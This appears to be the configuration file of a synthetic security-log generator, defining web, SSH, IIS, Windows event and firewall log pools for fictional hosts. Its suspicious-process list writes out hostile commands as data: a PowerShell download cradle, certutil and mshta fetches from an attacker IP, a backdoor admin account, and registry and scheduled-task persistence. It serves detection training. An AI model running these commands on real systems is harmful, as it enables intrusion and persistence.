"""
Pulse Generator — Configuration
Defines data pools, format functions, and shared helpers.
"""
import random

# ---------------------------------------------------------------------------
# IP pools
# ---------------------------------------------------------------------------
LEGIT_IPS = [
    '192.168.1.105', '192.168.1.112', '192.168.1.88',
    '10.0.0.45', '10.0.0.67', '10.0.0.201',
    '172.16.5.14', '172.16.5.33',
    '203.0.113.15', '203.0.113.42', '203.0.113.78', '203.0.113.101',
    '198.51.100.22', '198.51.100.55', '198.51.100.130',
    '100.24.56.91', '100.24.56.147',
    '185.220.44.12', '185.220.44.88',
    '45.33.32.156', '45.33.32.201',
    '78.46.91.34', '78.46.91.102',
    '91.189.92.10', '91.189.92.44',
    '104.26.10.78', '104.26.10.155',
]

ATTACKER_IP_POOL = [
    '185.156.73.54', '45.155.205.233', '194.26.135.89', '89.248.167.131',
    '162.247.74.27', '171.25.193.78', '51.222.253.18', '103.75.201.45',
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'curl/7.88.1',
]

ATTACKER_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'python-requests/2.31.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

# ---------------------------------------------------------------------------
# Web paths
# ---------------------------------------------------------------------------
NORMAL_PATHS = [
    ('GET', '/', 200, (2048, 4096)),
    ('GET', '/index.php', 200, (2048, 4096)),
    ('GET', '/products.php', 200, (8192, 16384)),
    ('GET', '/product.php?id=1', 200, (3072, 5120)),
    ('GET', '/product.php?id=2', 200, (3072, 5120)),
    ('GET', '/product.php?id=3', 200, (3072, 5120)),
    ('GET', '/product.php?id=4', 200, (3072, 5120)),
    ('GET', '/product.php?id=5', 200, (3072, 5120)),
    ('GET', '/product.php?id=7', 200, (3072, 5120)),
    ('GET', '/product.php?id=12', 200, (3072, 5120)),
    ('GET', '/product.php?id=15', 200, (3072, 5120)),
    ('GET', '/category.php?cat=electronics', 200, (6144, 12288)),
    ('GET', '/category.php?cat=clothing', 200, (6144, 12288)),
    ('GET', '/category.php?cat=home', 200, (6144, 12288)),
    ('GET', '/category.php?cat=books', 200, (6144, 12288)),
    ('GET', '/page.php?file=about', 200, (1024, 2048)),
    ('GET', '/page.php?file=contact', 200, (1024, 2048)),
    ('GET', '/page.php?file=faq', 200, (1536, 2560)),
    ('GET', '/page.php?file=terms', 200, (2048, 3072)),
    ('GET', '/page.php?file=privacy', 200, (2048, 3072)),
    ('GET', '/page.php?file=shipping', 200, (1024, 2048)),
    ('GET', '/page.php?file=returns', 200, (1024, 2048)),
    ('GET', '/account/login.php', 200, (1024, 2048)),
    ('POST', '/account/login.php', 302, (0, 0)),
    ('GET', '/account/register.php', 200, (1536, 2560)),
    ('GET', '/account/profile.php', 200, (2048, 3072)),
    ('GET', '/cart.php', 200, (1024, 4096)),
    ('POST', '/cart.php?action=add', 302, (0, 0)),
    ('GET', '/search.php?q=laptop', 200, (4096, 8192)),
    ('GET', '/search.php?q=shoes', 200, (4096, 8192)),
    ('GET', '/search.php?q=headphones', 200, (4096, 8192)),
    ('GET', '/search.php?q=backpack', 200, (4096, 8192)),
    ('GET', '/assets/css/style.css', 200, (8192, 12288)),
    ('GET', '/assets/css/bootstrap.min.css', 200, (16384, 24576)),
    ('GET', '/assets/js/jquery.min.js', 200, (32768, 32768)),
    ('GET', '/assets/js/bootstrap.min.js', 200, (16384, 16384)),
    ('GET', '/assets/js/main.js', 200, (2048, 4096)),
    ('GET', '/assets/img/logo.png', 200, (4096, 8192)),
    ('GET', '/assets/img/banner.jpg', 200, (65536, 131072)),
    ('GET', '/assets/img/products/p1.jpg', 200, (32768, 65536)),
    ('GET', '/assets/img/products/p2.jpg', 200, (32768, 65536)),
    ('GET', '/assets/img/products/p3.jpg', 200, (32768, 65536)),
    ('GET', '/assets/img/products/p4.jpg', 200, (32768, 65536)),
    ('GET', '/favicon.ico', 200, (1024, 1024)),
    ('GET', '/robots.txt', 200, (128, 256)),
    ('GET', '/sitemap.xml', 200, (2048, 4096)),
    ('GET', '/api/products?page=1', 200, (4096, 8192)),
    ('GET', '/api/products?page=2', 200, (4096, 8192)),
    ('GET', '/api/cart/count', 200, (32, 64)),
]

NORMAL_404_PATHS = [
    ('GET', '/wp-login.php', 404, (256, 512)),
    ('GET', '/admin/', 404, (256, 512)),
    ('GET', '/old/index.html', 404, (256, 512)),
    ('GET', '/product.php?id=999', 404, (256, 512)),
    ('GET', '/.env', 404, (256, 512)),
]

REFERERS = [
    '-', 'https://www.google.com/',
    'https://www.google.com/search?q=brightmall+shop',
    'https://www.google.com/search?q=buy+electronics+online',
    'https://www.bing.com/', 'https://brightmall.local/',
    'https://brightmall.local/products.php',
    'https://brightmall.local/category.php?cat=electronics',
    'https://brightmall.local/product.php?id=3',
    'https://brightmall.local/cart.php',
    'https://brightmall.local/account/login.php',
    'https://www.facebook.com/', 'https://t.co/abc123',
]

HTTP_VERSIONS = ['HTTP/1.1', 'HTTP/1.1', 'HTTP/1.1', 'HTTP/2.0']

# ---------------------------------------------------------------------------
# SSH configuration
# ---------------------------------------------------------------------------
SSH_HOSTNAME = 'brightmall-web01'
SSH_LEGIT_USERS = ['deploy', 'admin', 'webmaster', 'sysadmin', 'jenkins', 'backup',
                   'devops', 'monitoring', 'appuser', 'ubuntu']
SSH_LEGIT_IPS = ['10.0.0.5', '10.0.0.10', '10.0.0.25',
                 '172.16.1.100', '172.16.1.101', '192.168.10.5', '192.168.10.20']
SSH_BRUTE_USERS = [
    'root', 'admin', 'test', 'user', 'guest', 'ubuntu', 'oracle',
    'postgres', 'mysql', 'ftp', 'www-data', 'pi', 'ec2-user',
    'deploy', 'git', 'nagios', 'tomcat', 'jenkins', 'ansible',
    'vagrant', 'docker', 'redis', 'hadoop', 'elastic', 'kafka',
    'support', 'info', 'mail', 'webadmin', 'ftpuser', 'backup',
    'testuser', 'demo', 'developer', 'sysadmin', 'operator',
]
SSH_INVALID_USERS = [
    'test', 'guest', 'user', 'oracle', 'postgres', 'ftp',
    'pi', 'ec2-user', 'git', 'nagios', 'tomcat', 'ansible',
    'vagrant', 'docker', 'redis', 'hadoop', 'elastic', 'kafka',
    'support', 'info', 'mail', 'ftpuser', 'testuser', 'demo',
    'developer', 'operator',
]
SSH_PORT = 22
SSH_LEGIT_CLIENTS = [
    'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6',
    'SSH-2.0-OpenSSH_9.0p1 Ubuntu-1ubuntu8.7',
    'SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3.3',
    'SSH-2.0-PuTTY_Release_0.80',
    'SSH-2.0-OpenSSH_9.6',
]
SSH_ATTACKER_CLIENTS = [
    'SSH-2.0-libssh2_1.10.0', 'SSH-2.0-paramiko_3.4.0', 'SSH-2.0-Go',
    'SSH-2.0-libssh-0.9.7', 'SSH-2.0-PUTTY', 'SSH-2.0-OpenSSH_8.2p1',
]
SYSLOG_SERVICES = ['systemd-logind', 'CRON', 'sudo', 'su', 'polkitd']

# ---------------------------------------------------------------------------
# IIS / NovaCRM configuration
# ---------------------------------------------------------------------------
IIS_SERVER_IP = '192.168.1.10'
IIS_HEADER = (
    "#Software: Microsoft Internet Information Services 10.0\n"
    "#Version: 1.0\n"
    "#Date: {date}\n"
    "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username "
    "c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\n"
)
IIS_NORMAL_PATHS = [
    ('GET', '/Default.aspx', '-', 200),
    ('GET', '/Home/Index', '-', 200),
    ('GET', '/Products/List', '-', 200),
    ('GET', '/Products/Detail', 'id=1', 200),
    ('GET', '/Products/Detail', 'id=2', 200),
    ('GET', '/Products/Detail', 'id=3', 200),
    ('GET', '/Products/Detail', 'id=5', 200),
    ('GET', '/Products/Detail', 'id=8', 200),
    ('GET', '/Content/Page', 'view=about', 200),
    ('GET', '/Content/Page', 'view=contact', 200),
    ('GET', '/Content/Page', 'view=faq', 200),
    ('GET', '/Content/Page', 'view=terms', 200),
    ('GET', '/Content/Page', 'view=careers', 200),
    ('GET', '/Account/Login', '-', 200),
    ('POST', '/Account/Login', '-', 302),
    ('GET', '/Account/Register', '-', 200),
    ('GET', '/Account/Profile', '-', 200),
    ('GET', '/Dashboard', '-', 200),
    ('GET', '/Reports/Monthly', '-', 200),
    ('GET', '/api/v1/products', 'page=1', 200),
    ('GET', '/api/v1/notifications', '-', 200),
    ('GET', '/Content/css/site.css', '-', 200),
    ('GET', '/Content/css/bootstrap.min.css', '-', 200),
    ('GET', '/Scripts/jquery-3.7.1.min.js', '-', 200),
    ('GET', '/Scripts/bootstrap.bundle.min.js', '-', 200),
    ('GET', '/Scripts/site.js', '-', 200),
    ('GET', '/Content/images/logo.png', '-', 200),
    ('GET', '/Content/images/banner.jpg', '-', 200),
    ('GET', '/favicon.ico', '-', 200),
]
IIS_USER_AGENTS = [
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36',
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:121.0)+Gecko/20100101+Firefox/121.0',
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/119.0.0.0+Safari/537.36+Edg/119.0.0.0',
    'Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)',
]
IIS_ATTACKER_AGENTS = [
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36',
    'python-requests/2.31.0',
    'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)',
]

# ---------------------------------------------------------------------------
# Windows Event Log configuration
# ---------------------------------------------------------------------------
WIN_HOSTNAME = 'NOVA-WEB01'
WIN_DOMAIN = 'NOVACORP'
WIN_LEGIT_USERS = ['svc_web', 'svc_sql', 'Administrator', 'j.smith', 'a.johnson',
                   'm.williams', 'b.davis', 'svc_backup', 'svc_monitor', 'SYSTEM']
WIN_WORKSTATIONS = ['WKS-ADMIN01', 'WKS-DEV03', 'WKS-HR02', 'WKS-FIN01',
                    'WKS-MKT01', 'JUMP-01', 'SRV-MGMT01']
WIN_BRUTE_USERS = ['Administrator', 'admin', 'Guest', 'j.smith', 'a.johnson',
                   'svc_web', 'svc_sql', 'backup', 'test', 'user',
                   'helpdesk', 'support', 'sa', 'dba']
WIN_SUSPICIOUS_PROCS = [
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c whoami'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c hostname'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c ipconfig /all'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c net user'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c net localgroup administrators'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c netstat -ano'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c tasklist'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c systeminfo'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c nltest /dclist:'),
    ('cmd.exe', r'C:\Windows\System32\cmd.exe', '/c net group "Domain Admins" /domain'),
    ('powershell.exe', r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
     "-ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.156.73.54/rev.ps1')\""),
    ('powershell.exe', r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
     '-c "Get-Process | Out-File C:\\Windows\\Temp\\p.txt"'),
    ('powershell.exe', r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
     '-enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoA'),
    ('certutil.exe', r'C:\Windows\System32\certutil.exe',
     '-urlcache -split -f http://185.156.73.54/payload.exe C:\\Windows\\Temp\\svchost.exe'),
    ('net.exe', r'C:\Windows\System32\net.exe', 'user hacker P@ssw0rd123! /add'),
    ('net.exe', r'C:\Windows\System32\net.exe', 'localgroup administrators hacker /add'),
    ('reg.exe', r'C:\Windows\System32\reg.exe',
     'add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svchost.exe'),
    ('schtasks.exe', r'C:\Windows\System32\schtasks.exe',
     '/create /tn "WindowsUpdate" /tr C:\\Windows\\Temp\\svchost.exe /sc onstart /ru SYSTEM'),
    ('mshta.exe', r'C:\Windows\System32\mshta.exe', 'http://185.156.73.54/payload.hta'),
    ('rundll32.exe', r'C:\Windows\System32\rundll32.exe', 'C:\\Windows\\Temp\\mal.dll,DllMain'),
]
WIN_NORMAL_PROCS = [
    ('svchost.exe', r'C:\Windows\System32\svchost.exe', '-k netsvcs -p'),
    ('taskhostw.exe', r'C:\Windows\System32\taskhostw.exe', ''),
    ('RuntimeBroker.exe', r'C:\Windows\System32\RuntimeBroker.exe', '-Embedding'),
    ('SearchIndexer.exe', r'C:\Windows\System32\SearchIndexer.exe', '/Embedding'),
    ('MsMpEng.exe', r'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe', ''),
    ('w3wp.exe', r'C:\Windows\System32\inetsrv\w3wp.exe', '-ap "DefaultAppPool"'),
    ('sqlservr.exe', r'C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe', '-sMSSQLSERVER'),
    ('conhost.exe', r'C:\Windows\System32\conhost.exe', '0x4'),
    ('WmiPrvSE.exe', r'C:\Windows\System32\wbem\WmiPrvSE.exe', ''),
    ('spoolsv.exe', r'C:\Windows\System32\spoolsv.exe', ''),
]

# ---------------------------------------------------------------------------
# Firewall (iptables) configuration
# ---------------------------------------------------------------------------
FW_HOSTNAME = 'fw-gw01'
FW_INTERNAL_NET = '192.168.1.'
FW_DMZ_NET = '10.10.10.'
FW_SERVER_IP = '10.10.10.5'
FW_LEGIT_PORTS = [80, 443, 53, 123, 8080, 3306, 5432, 22, 25, 587, 993]
FW_LEGIT_DEST_IPS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1',
    '13.107.42.14', '13.107.21.200',
    '142.250.80.46', '142.250.80.78',
    '104.16.132.229', '104.16.133.229',
    '151.101.1.69', '151.101.65.69',
    '52.96.108.34', '52.96.110.18',
    '34.120.54.55', '35.186.238.101',
]
FW_C2_IPS = ['185.156.73.54', '45.155.205.233', '194.26.135.89']

# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------
def pick(arr):
    return random.choice(arr)

def pick_n(arr, n):
    return random.sample(arr, min(n, len(arr)))

def rand_between(a, b):
    return random.randint(a, b)

def get_override(overrides, key, default=None):
    return (overrides or {}).get(key, default)

def get_attacker_ips(overrides, count):
    custom = (overrides or {}).get('custom_attacker_ips')
    pool = custom if custom else ATTACKER_IP_POOL
    return pick_n(pool, count)

# ---------------------------------------------------------------------------
# Log format functions
# ---------------------------------------------------------------------------
def format_log_line(ip, dt, method, path, http_ver, status, size, referer, ua):
    date_str = dt.strftime('%d/%b/%Y:%H:%M:%S +0000')
    return f'{ip} - - [{date_str}] "{method} {path} {http_ver}" {status} {size} "{referer}" "{ua}"'


def format_nginx_log_line(ip, dt, method, path, http_ver, status, size, referer, ua,
                          request_time=None, upstream_time=None):
    date_str = dt.strftime('%d/%b/%Y:%H:%M:%S +0000')
    rt = request_time if request_time is not None else random.randint(1, 5000) / 1000
    ut = upstream_time if upstream_time is not None else max(0.0, rt - random.randint(0, 100) / 1000)
    return (f'{ip} - - [{date_str}] "{method} {path} {http_ver}" {status} {size} '
            f'"{referer}" "{ua}" rt={rt:.3f} uct="0.000" uht="{ut:.3f}" urt="{ut:.3f}"')


def format_iis_log_line(dt, server_ip, method, uri_stem, uri_query, port,
                        username, client_ip, ua, referer, status, sub_status,
                        win32_status, time_taken):
    return (f'{dt.strftime("%Y-%m-%d")} {dt.strftime("%H:%M:%S")} {server_ip} '
            f'{method} {uri_stem} {uri_query} {port} {username} {client_ip} '
            f'{ua} {referer} {status} {sub_status} {win32_status} {time_taken}')


def format_auth_log_line(dt, hostname, service, pid, message):
    day = dt.day
    month = dt.strftime('%b')
    time_str = dt.strftime('%H:%M:%S')
    date_str = f'{month}  {day} {time_str}' if day < 10 else f'{month} {day} {time_str}'
    return f'{date_str} {hostname} {service}[{pid}]: {message}'


def format_fw_log_line(dt, hostname, action, in_if, out_if, src_ip, dst_ip,
                       proto, src_port, dst_port, extra=''):
    day = dt.day
    month = dt.strftime('%b')
    time_str = dt.strftime('%H:%M:%S')
    date_str = f'{month}  {day} {time_str}' if day < 10 else f'{month} {day} {time_str}'
    kern_ts = f'{random.randint(100000, 999999)}.{random.randint(100, 999)}'
    mac = ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))
    mac += ':00:0c:29:' + ':'.join(f'{random.randint(0, 255):02x}' for _ in range(3)) + ':08:00'
    line = (f'{date_str} {hostname} kernel: [{kern_ts}] [{action}] '
            f'IN={in_if} OUT={out_if} MAC={mac} SRC={src_ip} DST={dst_ip} '
            f'LEN={random.randint(40, 1500)} TOS=0x00 PREC=0x00 '
            f'TTL={random.randint(48, 128)} ID={random.randint(1, 65535)} PROTO={proto}')
    if proto in ('TCP', 'UDP'):
        line += f' SPT={src_port} DPT={dst_port}'
    if proto == 'TCP':
        flags = extra or 'SYN'
        line += f' WINDOW={random.randint(8192, 65535)} RES=0x00 {flags} URGP=0'
    if proto == 'UDP':
        line += f' LEN={random.randint(20, 512)}'
    if proto == 'ICMP':
        line += f' TYPE=8 CODE=0 ID={random.randint(1, 65535)} SEQ={random.randint(1, 100)}'
    return line


def format_win_event_line(dt, event_id, level, computer, source, message):
    date_str = dt.strftime('%Y-%m-%dT%H:%M:%S.') + f'{dt.microsecond // 1000:03d}Z'
    escaped_msg = '"' + message.replace('"', '""') + '"'
    return f'{date_str},{event_id},{level},{computer},{source},{escaped_msg}'
